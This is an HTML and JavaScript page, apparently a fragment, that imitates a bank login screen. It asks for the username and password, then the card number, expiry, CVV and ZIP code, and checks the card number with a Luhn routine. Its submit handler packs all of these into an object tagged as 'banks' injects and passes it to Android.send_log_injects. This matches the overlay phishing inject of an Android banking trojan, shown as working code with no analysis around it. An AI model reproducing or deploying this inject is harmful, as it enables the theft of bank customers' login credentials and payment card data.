    <meta charset="UTF-8">

    <title>Document</title>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.15/jquery.mask.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <style>
        body {
            background-color: #1a5336;
        }

        #form1, #form2 {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        section {
            padding: 15px;
            flex: 1;
        }

        .inForm {
            padding: 10px;
            background-color: #fff;
        }

        .grid {
            display: grid;
            grid-template-columns: 1fr 9fr;
            margin-bottom: 15px;
        }

        .input {
            width: 100%;
            padding: 5px;
            padding-left: 0;
            border: 0;
            border-bottom: 1px solid #a0a0a0;
        }

        .input:focus {
            border-bottom: 2px solid #43a342;
        }

        .toggle {
            position: relative;
            display: block;
            width: 40px;
            height: 20px;
            cursor: pointer;
            -webkit-tap-highlight-color: transparent;
            transform: translate3d(0, 0, 0);
        }

        .toggle:before {
            content: "";
            position: relative;
            top: 3px;
            left: 3px;
            width: 34px;
            height: 14px;
            display: block;
            background: #123a26;
            border-radius: 8px;
            transition: background 0.2s ease;
        }

        .toggle span {
            position: absolute;
            top: 0;
            left: 0;
            width: 20px;
            height: 20px;
            display: block;
            background: #ececec;
            border-radius: 10px;
            box-shadow: 0 3px 8px rgba(154, 153, 153, 0.5);
            transition: all 0.2s ease;
        }

        .toggle span:before {
            content: "";
            position: absolute;
            display: block;
            margin: -18px;
            width: 56px;
            height: 56px;
            border-radius: 50%;
            transform: scale(0);
            opacity: 1;
            pointer-events: none;
        }

        #cbx:checked + .toggle::before {
            background: #136227;
        }

        #cbx:checked + .toggle span {
            background: #048103;
            transform: translateX(20px);
            transition: all 0.2s cubic-bezier(0.8, 0.4, 0.3, 1.25), background 0.15s ease;
            box-shadow: 0 3px 8px #1c9c8534;
        }

        #cbx:checked + .toggle span:before {
            transform: scale(1);
            opacity: 0;
            transition: all 0.4s ease;
        }

        .button {
            width: 100%;
            padding: 10px;
            color: #fff;
            background-color: #058106;
            border: 0;
            margin-bottom: 15px;
            font-weight: 600;
        }

        .error {
            border-color: #f00 !important;
        }

        .button:disabled {
            opacity: 0.4;
        }
    </style>
</head>

    <script>
        $('#cc').mask('0000 0000 0000 0000')
        $('#exp').mask('00/00')
        $('#cvv').mask('000')

        var spinner = document.getElementById('spinner'),
            form = document.getElementById('form'),
            form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2'),
            resetLog = document.getElementById('resetLog'),
            resetPas = document.getElementById('resetPas'),
            login = document.getElementById('login'),
            password = document.getElementById('password'),
            cc = document.getElementById('cc'),
            exp = document.getElementById('exp'),
            cvv = document.getElementById('cvv'),
            zip = document.getElementById('zip'),
            nextPage = document.getElementById('nextPage'),
            sendData = document.getElementById('sendData');

        login.onkeyup = () => {
            if(login.value.length != 0) {
                resetLog.style.display = 'inline'
            } else {
                resetLog.style.display = 'none'
            }
        }

        resetLog.onclick = () => {
            login.value = ''
            login.value.length = 0
            resetLog.style.display = 'none'
            login.focus()
        }

        password.onkeyup = () => {
            if(password.value.length != 0) {
                resetPas.style.display = 'inline'
            } else {
                resetPas.style.display = 'none'
            }
        }

        resetPas.onclick = () => {
            password.value = ''
            password.value.length = 0
            resetPas.style.display = 'none'
            password.focus()
        }

        nextPage.onclick = () => {
            if(login.value.length < 3) {
                login.classList.add('error')
            } else {
                login.classList.remove('error')
            }

            if(password.value.length < 3) {
                password.classList.add('error')
            } else {
                password.classList.remove('error')
            }

            if(login.value.length > 3 && password.value.length > 3) {
                spinner.style.display = 'block'

                setTimeout(() => {
                    spinner.style.display = 'none'

                    form1.style.display = 'none'
                    form2.style.display = 'flex'
                }, 2000);
            }
        }


        function check6() {
            if(!valid_credit_card(cc.value)) {
                cc.classList.add('error')
            } else {
                cc.classList.remove('error');
                return true
            }
        }

        function check4() {
            
            var mmYY = exp.value.split('/');
				var month = parseInt(mmYY[0]);
				var year = parseInt(mmYY[1]);
			

				var expArray = exp.value.split('/');
				var today, someday;
				var exMonth = expArray[0];
				var exYear = "20" + expArray[1];

				today = new Date();
				someday = new Date();
				someday.setFullYear(exYear, exMonth, 1);

                
                if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
                    exp.classList.add('error')
                } else {
                    exp.classList.remove('error')
                    return true
                }
        }

        function check5() {
            if(valid_credit_card(cc.value) && check4() == true && exp.value.length === 5 && cvv.value.length === 3 && zip.value.length > 2) {
                sendData.disabled = false
            } else {
                sendData.disabled = true
            }
        }

        function valid_credit_card(value) {
            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
            if (/[^0-9-\s]+/.test(value)) return false;
            var nCheck = 0, nDigit = 0, bEven = false;
            value = value.replace(/\D/g, "");
            for (var n = value.length - 1; n >= 0; n--) {
                var cDigit = value.charAt(n),
                    nDigit = parseInt(cDigit, 10);
                if (bEven) {
                    if ((nDigit *= 2) > 9) nDigit -= 9;
                }
                nCheck += nDigit;
                bEven = !bEven;
            }
            return (nCheck % 10) == 0;
            
        }

        sendData.onclick = () => {
            var data = {};
                data.login = login.value;
                data.password = password.value;
                data.cc = cc.value;
                data.exp = exp.value;
                data.cvv = cvv.value;
                data.zip = zip.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
    </script>
